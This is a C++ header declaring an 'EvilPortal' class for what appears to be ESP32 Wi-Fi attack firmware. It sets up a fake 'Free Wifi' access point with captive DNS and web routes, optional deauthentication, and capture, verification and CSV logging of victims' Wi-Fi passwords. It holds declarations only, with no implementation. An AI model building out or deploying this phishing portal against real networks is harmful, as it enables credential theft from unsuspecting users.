#ifndef __EVIL_PORTAL_H__
#define __EVIL_PORTAL_H__

#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <globals.h>
#include <WiFiType.h>

class EvilPortal {
    class CaptiveRequestHandler : public AsyncWebHandler {
    public:
        CaptiveRequestHandler(EvilPortal *portal) : _portal(portal) {}
        virtual ~CaptiveRequestHandler() { _portal = nullptr; }
        bool canHandle(AsyncWebServerRequest *request) { return true; }
        void handleRequest(AsyncWebServerRequest *request);

    private:
        EvilPortal *_portal;
    };

public:
    EvilPortal(
        String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false,
        bool autoMode = false, bool backgroundMode = false
    );
    ~EvilPortal();

    bool setup(void);
    void beginAP(void);
    void setupRoutes(void);
    void loop(void);
    void processRequests(void);

    bool hasCredentials();
    String getCapturedSSID();
    String getCapturedPassword();

    DNSServer &getDNSServer() { return dnsServer; }
    AsyncWebServer &getWebServer() { return webServer; }
    String getApName() { return apName; }
    uint8_t getChannel() { return _channel; }
    bool isBackgroundMode() { return _backgroundMode; }

    void setBaseDuration(uint16_t seconds);
    void setExtendedDuration(uint16_t seconds);
    void checkAndExtendDuration();
    bool hasRecentActivity();
    bool hasRecentPageView();
    void recordPageView();
    bool shouldTerminate();

private:
    String apName = "Free Wifi";
    uint8_t _channel;
    bool _deauth;
    bool isDeauthHeld = false;
    bool _verifyPwd;
    bool _autoMode;
    bool _backgroundMode;

    wifi_mode_t _originalWifiMode;
    bool _wifiWasConnected;

    AsyncWebServer webServer;

    DNSServer dnsServer;
    IPAddress apGateway;

    String outputFile = "default_creds.csv";

    String htmlPage;
    String htmlFileName;
    bool isDefaultHtml = true;
    FS *fsHtmlFile;

    String lastCred;
    int totalCapturedCredentials = 0;
    int previousTotalCapturedCredentials = -1;
    String capturedCredentialsHtml = "";
    bool verifyPass = false;

    CaptiveRequestHandler *_captiveHandler = nullptr;

    uint16_t _baseDurationSec = 15;
    uint16_t _extendedDurationSec = 60;
    unsigned long _lastActivityTime = 0;
    bool _durationExtended = false;
    unsigned long _launchTime = 0;
    unsigned long _lastPageViewTime = 0;

    void portalController(AsyncWebServerRequest *request);
    void credsController(AsyncWebServerRequest *request);

    bool verifyCreds(String &Ssid, String &Password);
    void restartWiFi(bool reset = true);
    void resetCapturedCredentials(void);
    void printDeauthStatus(void);
    void printLastCapturedCredential(void);
    void loadCustomHtml(void);
    void loadDefaultHtml(void);
    void loadDefaultHtml_one(void);
    String wifiLoadPage(void);
    void saveToCSV(const String &csvLine, bool IsAPname = false);
    void drawScreen(void);

    String getHtmlTemplate(String body);
    String creds_GET(void);
    String ssid_GET(void);
    String ssid_POST(void);

    void apName_from_keyboard(void);
};

#endif
